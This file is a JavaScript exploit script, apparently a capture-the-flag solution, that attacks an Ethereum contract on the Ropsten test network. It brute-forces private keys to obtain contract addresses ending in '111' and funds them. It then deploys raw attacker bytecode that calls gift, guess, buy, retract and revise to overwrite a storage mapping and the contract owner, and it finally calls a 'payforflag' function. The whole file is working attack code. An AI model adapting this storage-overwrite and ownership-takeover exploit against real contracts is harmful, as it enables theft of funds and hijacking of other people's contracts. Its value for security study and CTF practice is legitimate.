const util = require('ethereumjs-util')
const Web3 = require('web3')
var web3 = new Web3()
web3.setProvider(new Web3.providers.HttpProvider("https://ropsten.infura.io"))
ac = web3.eth.accounts.wallet.add(process.env.ETHPRIVKEY)

// exp1 revise
data1 = '0x608060405273168892cb672a747f193eb4aca7b964bfb0aa64766000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b50604051604080610670833981018060405281019080805190602001909291908051906020019092919050505060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f6769667428290000000000000000000000000000000000000000000000000000815250600601905060405180910390207c010000000000000000000000000000000000000000000000000000000090046040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303816000875af19250505050600360014303406001900481151561017657fe5b0690506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f67756573732875696e7432353629000000000000000000000000000000000000815250600e01905060405180910390207c01000000000000000000000000000000000000000000000000000000009004826040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303816000875af192505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f6275792829000000000000000000000000000000000000000000000000000000815250600501905060405180910390207c010000000000000000000000000000000000000000000000000000000090046040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303816000875af192505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f7265747261637428290000000000000000000000000000000000000000000000815250600901905060405180910390207c010000000000000000000000000000000000000000000000000000000090046040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303816000875af192505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f7265766973652875696e743235362c6279746573333229000000000000000000815250601701905060405180910390207c010000000000000000000000000000000000000000000000000000000090046001604051808281526020019150506040518091039020600190048503846001026040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808381526020018260001916600019168152602001925050506000604051808303816000875af192505050505050506101648061050c6000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633a5f43dc14610046575b600080fd5b34801561005257600080fd5b5061005b61005d565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180806020018281038252600e8152602001807f706179666f72666c616774657374000000000000000000000000000000000000815250602001915050600060405180830381600087803b15801561011e57600080fd5b505af1158015610132573d6000803e3d6000fd5b505050505600a165627a7a7230582013436b58bee356b2a93f8f169e65b3023c2bb51c5d1a92346e7c30af6c0cd4ae0029'

// exp2 make bool2 true
// don't forget to change function digest a8286aca
data2 = '0x6080604052600160005573168892cb672a747f193eb4aca7b964bfb0aa6476600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006a57600080fd5b506101cc8061007a6000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634de260a214610051578063a8286aca14610068575b600080fd5b34801561005d57600080fd5b506100666100a9565b005b34801561007457600080fd5b5061009360048036038101908080359060200190929190505050610178565b6040518082815260200191505060405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323de86357c0100000000000000000000000000000000000000000000000000000000027c0100000000000000000000000000000000000000000000000000000000900460006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260ff1681526020019150506000604051808303816000875af19250505050565b600060016000808282540192505081905550600260005481151561019857fe5b0690509190505600a165627a7a72305820e8913d6b199f55126a5ad714b7c606e959fa1344f1035152d83be9d77d7d3e4d0029'

sol = 0
addrs = []
i = web3.utils.toBN(web3.utils.randomHex(20))
while (addrs.length < 2) {
    priv = '0x' + i.toString(16).padStart(64, '0')
    account = web3.eth.accounts.privateKeyToAccount(priv)
    ct_addr = '0x' + util.keccak256(util.rlp.encode([account.address, 0])).slice(12).toString('hex')
    if (ct_addr.endsWith('111')) {
        console.log(account.address, ct_addr)
        web3.eth.accounts.wallet.add(account.privateKey)
        addrs.push(account.address)
        if (sol == 0) { sol = ct_addr }
    }
    i = i.addn(1)
}

web3.eth.getTransactionCount(ac.address).then(nonce => {
    // get bool2
    web3.eth.call({ to: '0x168892cb672a747f193eb4aca7b964bfb0aa6476', data: '0xe4d16afc' }).then(ret => {
        if (web3.utils.toDecimal(ret) == 0) {
            console.log('setting bool2')
            // change bool2
            ct_addr = '0x' + util.keccak256(util.rlp.encode([ac.address, nonce])).slice(12).toString('hex')
            web3.eth.sendTransaction({
                from: ac.address,
                to: '',
                nonce: nonce++,
                data: data2,
                gas: 1000000,
                gasPrice: 90000000000
            }).catch(new Function())
            web3.eth.sendTransaction({
                from: ac.address,
                to: ct_addr,
                nonce: nonce++,
                data: web3.utils.keccak256('hack()').slice(0, 10),
                gas: 1000000,
                gasPrice: 90000000000
            }).catch(new Function())
        } else {
            console.log('bool2 already setted')
        }
        // transfer
        for (addr of addrs) {
            web3.eth.sendTransaction({
                from: ac.address,
                to: addr,
                nonce: nonce++,
                value: web3.utils.toWei('0.1'),
                gas: 1000000,
                gasPrice: 90000000000
            }).catch(new Function())
        }
    })
})


function exp() {
    // new accounts depoly
    web3.eth.getBalance(addrs[0]).then(balance => {
        if (balance > 0) {
            clearInterval(interval)
            console.log('transfer comfirmed')
            // change mapping1 (slot 5)
            web3.eth.sendTransaction({
                from: addrs[0],
                to: '',
                nonce: 0,
                data: data1 + web3.utils.soliditySha3({ type: 'uint256', value: sol }, 5).slice(2) + '1'.repeat(64),
                gas: 1000000,
                gasPrice: 90000000000
            }).catch(new Function())
            // change owner
            web3.eth.sendTransaction({
                from: addrs[1],
                to: '',
                nonce: 0,
                data: data1 + '0'.repeat(64) + sol.slice(2).padStart(64, '0'),
                gas: 1000000,
                gasPrice: 90000000000
            }).catch(new Function())
            // pff
            web3.eth.sendTransaction({
                from: addrs[1],
                to: sol,
                nonce: 1,
                value: 0,
                data: web3.utils.keccak256('pff()').slice(0, 10),
                gas: 1000000,
                gasPrice: 8000000000
            }).catch(new Function())
        } else {
            console.log('transfer pending...')
        }
    })
}

interval = setInterval(exp, 5000)